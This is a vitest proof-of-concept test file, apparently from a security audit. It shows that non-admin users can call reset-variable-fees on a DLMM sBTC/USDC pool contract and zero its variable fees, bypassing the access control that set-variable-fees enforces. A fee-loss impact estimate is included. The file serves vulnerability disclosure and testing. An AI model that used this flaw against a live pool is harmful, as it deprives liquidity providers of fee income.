import {
  alice,
  bob,
  charlie,
  deployer,
  dlmmCore,
  errors,
  sbtcUsdcPool,
  mockSbtcToken,
  mockUsdcToken,
  setupTestEnvironment,
} from "../helpers/helpers";

import { describe, it, expect, beforeEach } from 'vitest';
import { cvToValue } from '@clarigen/core';
import { txErr, txOk, rovOk } from '@clarigen/test';

/**
 * PoC Test: reset-variable-fee Access Control Bypass
 * 
 * This test demonstrates that ANY user can call reset-variable-fees,
 * bypassing the access control that exists for set-variable-fees.
 * 
 */
describe('reset-variable-fee Access Control Bypass PoC', () => {
  
  beforeEach(async () => {
    setupTestEnvironment();
  });

  describe('Bug Demonstration: Unauthorized reset-variable-fees access', () => {

    it('PROVES BUG: Non-admin user (bob) can reset variable fees without authorization', async () => {
      // Step 0: Admin sets a short cooldown to bypass the cooldown check
      txOk(dlmmCore.setVariableFeesCooldown(
        sbtcUsdcPool.identifier,
        0n // 0 block cooldown
      ), deployer);
      
      // Step 1: Admin sets variable fees
      const initialXVariableFee = 200n; // 2%
      const initialYVariableFee = 150n; // 1.5%
      
      txOk(dlmmCore.setVariableFees(
        sbtcUsdcPool.identifier,
        initialXVariableFee,
        initialYVariableFee
      ), deployer);
      
      // Verify fees were set
      let poolData = rovOk(sbtcUsdcPool.getPool());
      expect(poolData.xVariableFee).toBe(initialXVariableFee);
      expect(poolData.yVariableFee).toBe(initialYVariableFee);
      console.log('✓ Admin set variable fees to X=2%, Y=1.5%');
      
      // Step 2: BUG - Bob (non-admin, non-manager) can reset variable fees
      console.log('⚠️  BUG: Attempting reset-variable-fees as non-admin (bob)...');
      
      // This should FAIL with ERR_NOT_AUTHORIZED, but it would SUCCEED if not for cooldown
      // After setting cooldown to 0, this should work
      const resetResponse = txOk(dlmmCore.resetVariableFees(
        sbtcUsdcPool.identifier
      ), bob);
      
      // Verify fees were reset by bob
      poolData = rovOk(sbtcUsdcPool.getPool());
      expect(poolData.xVariableFee).toBe(0n);
      expect(poolData.yVariableFee).toBe(0n);
      
      console.log('✓ BUG CONFIRMED: Bob (non-admin) successfully reset variable fees to 0%');
      console.log('  This should have failed with ERR_NOT_AUTHORIZED');
    });

    it('PROVES BUG: Charlie (random user with no privileges) can reset variable fees', async () => {
      // Step 0: Admin sets a short cooldown
      txOk(dlmmCore.setVariableFeesCooldown(
        sbtcUsdcPool.identifier,
        0n
      ), deployer);
      
      // Step 1: Admin sets variable fees
      txOk(dlmmCore.setVariableFees(
        sbtcUsdcPool.identifier,
        300n, // 3%
        250n  // 2.5%
      ), deployer);
      
      // Verify
      let poolData = rovOk(sbtcUsdcPool.getPool());
      expect(poolData.xVariableFee).toBe(300n);
      expect(poolData.yVariableFee).toBe(250n);
      
      // Step 2: BUG - Charlie (completely unrelated user) can reset
      console.log('⚠️  BUG: Attempting reset-variable-fees as random user (charlie)...');
      
      const resetResponse = txOk(dlmmCore.resetVariableFees(
        sbtcUsdcPool.identifier
      ), charlie);
      
      // Verify fees were reset by charlie
      poolData = rovOk(sbtcUsdcPool.getPool());
      expect(poolData.xVariableFee).toBe(0n);
      expect(poolData.yVariableFee).toBe(0n);
      
      console.log('✓ BUG CONFIRMED: Charlie (random user) successfully reset variable fees');
    });

    it('COMPARISON: set-variable-fees correctly rejects non-admin users', async () => {
      // This test shows the INCONSISTENCY - set-variable-fees has proper access control
      // but reset-variable-fees does not
      
      // Try to set variable fees as bob - should FAIL
      const setResponse = txErr(dlmmCore.setVariableFees(
        sbtcUsdcPool.identifier,
        100n, // 1%
        100n  // 1%
      ), bob);
      
      // This correctly returns ERR_NOT_AUTHORIZED
      expect(cvToValue(setResponse.result)).toBe(errors.dlmmCore.ERR_NOT_AUTHORIZED);
      console.log('✓ set-variable-fees correctly rejects non-admin (bob)');
      
      // Set cooldown to 0 to bypass that check
      txOk(dlmmCore.setVariableFeesCooldown(sbtcUsdcPool.identifier, 0n), deployer);
      
      // Set some fees first
      txOk(dlmmCore.setVariableFees(sbtcUsdcPool.identifier, 100n, 100n), deployer);
      
      // But reset-variable-fees would succeed (proven in previous tests)
      const resetResponse = txOk(dlmmCore.resetVariableFees(
        sbtcUsdcPool.identifier
      ), bob);
      
      const poolData = rovOk(sbtcUsdcPool.getPool());
      expect(poolData.xVariableFee).toBe(0n);
      console.log('⚠️  INCONSISTENCY: reset-variable-fees allows bob but set-variable-fees rejects bob');
    });
    
  });

  describe('Impact Analysis', () => {
    
    it('Quantifies financial impact of the bug', async () => {
      // Set short cooldown
      txOk(dlmmCore.setVariableFeesCooldown(sbtcUsdcPool.identifier, 0n), deployer);
      
      // Set up scenario with realistic fees
      const variableFeeRate = 300n; // 3%      
      
      // Set fees
      txOk(dlmmCore.setVariableFees(
        sbtcUsdcPool.identifier,
        variableFeeRate,
        variableFeeRate
      ), deployer);
      
      // Attacker resets after passing Variable-Fee-Cooldown , here set to 0
      txOk(dlmmCore.resetVariableFees(sbtcUsdcPool.identifier), bob);
      
      // Verify 0 fees
      const poolData = rovOk(sbtcUsdcPool.getPool());
      expect(poolData.xVariableFee).toBe(0n);
      expect(poolData.yVariableFee).toBe(0n);
     
      // After reset , LPs in bin-id will loose a substantial amount of fees
      // that come from variable fees, it is high especially during high voltality 
      
      // Example - If attacker/ or any swapper, swap any asset (10 sBTC) then he/she won't be charged variable-fees
      // , as variable fees have become 0 , in this way Swapper can bypass paying variable-fees
      // As a result , There will be no gain in LP fees in that bin , coming from variable-fees
      const swapAmount = 1000000000n; // 10 sBTC
      const expectedFeeLoss = (swapAmount * variableFeeRate) / 10000n; // 3% of swap
      
      console.log('=== Financial Impact Analysis ===');
      console.log(`Swap Amount: ${swapAmount } equivalent to 10 sBTC`);
      console.log(`Variable Fee Rate: ${variableFeeRate}`);
      console.log(`Expected Fee Loss : ${expectedFeeLoss } in sBTC with 8 decimals`);
      
    });
  });

  
});
